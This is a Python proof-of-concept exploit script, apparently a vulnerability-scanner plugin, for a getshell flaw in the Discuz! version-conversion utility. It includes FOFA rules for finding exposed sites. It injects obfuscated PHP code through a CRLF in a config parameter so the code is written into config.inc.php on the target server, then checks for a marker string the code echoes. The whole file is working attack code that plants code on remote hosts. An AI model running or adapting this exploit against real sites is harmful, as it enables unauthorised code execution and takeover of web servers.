#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import requests.packages.urllib3
from Config.config_requests import headers
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 脚本信息
######################################################
NAME='discuz_version_change_getshell'
AUTHOR="境心"
REMARK='discuz 版本转换功能getshell漏洞'
FOFA_RULE='app="Powered-by-Discuz!NT"'
FOFA_RULE='app="Tencent-Discuz"'    ###这个也可以的
######################################################

def poc(target):
    result = {}
    poc_key = 'newconfig[aaa\x0a\x0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(101).CHR(99).CHR(104).CHR(111).CHR(32).CHR(39).CHR(116).CHR(104).CHR(105).CHR(115).CHR(32).CHR(105).CHR(115).CHR(32).CHR(97).CHR(32).CHR(102).CHR(114).CHR(105).CHR(101).CHR(110).CHR(100).CHR(108).CHR(121).CHR(32).CHR(116).CHR(101).CHR(115).CHR(116).CHR(44).CHR(32).CHR(80).CHR(108).CHR(101).CHR(97).CHR(115).CHR(101).CHR(32).CHR(99).CHR(104).CHR(101).CHR(99).CHR(107).CHR(32).CHR(97).CHR(110).CHR(100).CHR(32).CHR(114).CHR(101).CHR(112).CHR(97).CHR(105).CHR(114).CHR(32).CHR(118).CHR(117).CHR(108).CHR(110).CHR(101).CHR(114).CHR(97).CHR(98).CHR(105).CHR(108).CHR(105).CHR(116).CHR(105).CHR(101).CHR(115).CHR(46).CHR(39).CHR(59).CHR(34).CHR(41).CHR(59));//]'
    # utility目录在实际环境中的什么位置不确定，默认在网站根目录下，若不在网站根目录下的，会漏报
    vul_url = target+"/utility/convert/index.php"
    # 经测试，这里source可以写多个，能匹配多个版本，又不影响getshell时的功能，source越多，漏报越少
    data = {
        "a" :"config",
        "source": "ss7.5_x2.0",
        "source": "uch2.0_x2.0",
        "source" : "d7.2_x2.0",
        "source": "ss7.5_x1.5",
        "source": "uch2.0_x1.0",
        "source": "uch2.0_x1.5",
        "source": "d7.2_x1.5",
        "source": "d7.2_x1.0",
        "source": "ss7.5_x1.0",
        "submit" : "yes",
        poc_key : "aaaa"
    }
    requests.post(vul_url, headers=headers, data=data, verify=False, timeout=5)
    target_url = target+"/utility/convert/data/config.inc.php"
    target_res = requests.get(target_url, headers=headers, verify=False, timeout=5)
    if "this is a friendly test, Please check and repair vulnerabilities." in target_res.text:
        result['poc_url'] = target_url
        result['poc'] =NAME
        result['message'] = "存在版本转换功能getshell漏洞"
        return result

if __name__ == '__main__':
    poc("http://127.0.0.1/Discuz_X3.2_SC_GBK/")